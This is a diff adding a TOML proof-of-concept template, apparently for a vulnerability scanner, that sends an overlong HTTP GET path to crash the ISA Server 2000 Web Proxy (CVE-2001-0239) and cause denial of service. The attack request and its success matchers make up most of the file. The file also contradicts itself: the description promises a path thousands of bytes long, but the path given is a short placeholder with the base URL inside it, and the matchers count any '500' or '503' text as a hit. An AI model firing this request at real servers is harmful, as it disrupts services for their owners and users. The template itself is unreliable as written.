@@ -1,0 +1,34 @@
+[info]
+author = "AVE"
+description = "向 ISA Server 2000 Web Proxy 发送包含超长路径的 HTTP GET 请求，可触发 Web Proxy 服务崩溃导致拒绝服务。通过发送数千字节长度的路径字符串，代理服务在处理畸形请求时因输入验证缺陷而停止响应。"
+id = "POC-AVE-2001-0096"
+name = "Microsoft ISA Server 2000 Web Proxy DoS PoC"
+severity = "high"
+tags = [
+    "cve-2001-0239",
+    "dos",
+    "isa-server",
+]
+vuln_id = [
+    "CVE-2001-0239",
+    "AVE-2001-0096",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/AAAA[AAA]/AAAA[AAA]"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Connection refused",
+    "Service Unavailable",
+    "500",
+    "503",
+]
